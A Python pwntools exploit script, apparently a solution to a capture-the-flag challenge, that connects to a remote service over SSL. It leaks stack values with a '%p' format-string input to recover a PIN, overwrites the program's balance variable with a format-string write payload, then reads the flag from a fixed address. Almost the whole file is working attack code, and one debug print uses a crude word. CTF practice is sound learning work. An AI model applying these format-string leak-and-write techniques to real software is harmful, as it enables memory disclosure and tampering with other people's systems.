from pwn import *

HOST = "xxx.vuln.gg"
PORT = 443

elf = ELF("./challenge")
context.binary = elf

BALANCE = 0x4c8004
TARGET_BALANCE = 0x13370001
FLAG = 0x4c9ae0

io = remote(HOST, PORT, ssl=True)

io.recvuntil(b"username:")
io.sendline(b"%p " * 20)

data = io.recvuntil(b"pin:")

parts = data.split()
pin = None

for i, p in enumerate(parts):
    if p.startswith(b"0x"):
        value = int(p, 16)
        raw = p64(value)

        if raw.isdigit():
            pin = raw.decode()
            print("bastard at: ", i)
            break

if pin == None:
    log.failure("No pin")

print("pin = ", pin)
io.sendline(pin.encode())

io.recvuntil(b"Exit")
io.sendline(b"1")      # gamble

io.recvuntil(b"bet:")
io.sendline(b"1")      # min bet

print(io.recvuntil(b"election?").decode())
payload = fmtstr_payload(
    10,
    {BALANCE: TARGET_BALANCE},
    write_size="short"
)
print(io.sendline(payload))
print("PAYLOAD: ", payload)

print(io.recvuntil(b"Exit"))
io.sendline(b"2")       # buy flag

io.recvuntil(b"Exit")
io.sendline(b"3")

io.recvuntil(b"feedback:")
payload = f"%11$s".encode().ljust(8, b"\0") + p64(FLAG)
io.sendline(payload)

print(io.recvall().decode())
io.interactive()
